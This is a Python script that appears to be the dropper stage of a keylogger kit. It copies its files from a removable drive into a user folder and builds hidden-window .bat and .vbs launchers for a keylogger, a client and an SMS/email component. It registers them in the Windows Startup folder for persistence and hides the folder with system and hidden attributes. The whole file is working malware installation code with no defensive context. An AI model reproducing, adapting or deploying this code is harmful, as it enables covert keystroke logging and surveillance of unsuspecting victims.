import subprocess
import os
import getpass
import win32com.client


class Main:
    def __init__(self):
        ...

    @classmethod
    def copy_files(cls):  # copy all files to safe place in client pc
        drive = os.getcwd().split(":")[0]
        user = getpass.getuser()
        subprocess.run(f'mkdir C:\\Users\\"{user}"\\Python', shell=True)  # make a empty folder named python
        subprocess.run(f'xcopy {drive}: C:\\Users\\"{user}\\Python" /e /s')  # copy all files ie. code files and python itself
        Main.bat_file('keylogger.pyw')  # make keylogger.bat
        Main.bat_file('client.pyw')  # make client.bat
        Main.bat_file('sms_email.pyw')  # make sms_email.bat
        Main.vbs_file('keylogger.bat')  # make keylogger.vbs
        Main.vbs_file('client.bat')  # make client.vbs
        Main.vbs_file('sms_email.bat')  # make sms_email.vbs
        Main.shortcut('keylogger.vbs')  # make shortcut
        Main.shortcut('client.vbs')  # make shortcut
        Main.shortcut('sms_email.vbs')  # make shortcut
        Main.hide_folder()  # hide python folder

    @classmethod
    def bat_file(cls, file):
        user = getpass.getuser()
        python_path = f'C:\\Users\\{user}\\Python\\python.exe'
        file_path = f'C:\\Users\\{user}\\Python\\{file}'
        file_name = file.split('.')[0]
        with open(f'C:\\Users\\{user}\\Python\\{file_name}.bat', 'w+') as bat_file:
            bat_file.write(f'"{python_path}" "{file_path}"\npause')

    @classmethod
    def vbs_file(cls, file):
        user = getpass.getuser()
        file_name = file.split('.')[0]
        path = f'C:\\Users\\{user}\\Python\\{file_name}.vbs'
        file_path = f'C:\\Users\\{user}\\Python\\{file}'
        with open(f'{path}', 'w+') as vbs_file:
            vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "{file_path}" & Chr(34), 0\nSet WshShell = Nothing')

    @classmethod
    def shortcut(cls, file):
        user = getpass.getuser()
        file_name = file.split('.')[0]
        path_store = f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        path = os.path.join(path_store, f'{file_name}.lnk')
        path_file = f'C:\\Users\\{user}\\Python\\{file_name}.vbs'

        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(path)
        shortcut.Targetpath = path_file
        shortcut.save()

    @classmethod
    def hide_folder(cls):  # hide python folder
        user = getpass.getuser()
        path = f'C:\\Users\\"{user}"\\Python'
        subprocess.run(f'attrib +s +h {path}', shell=True)


Main.copy_files()
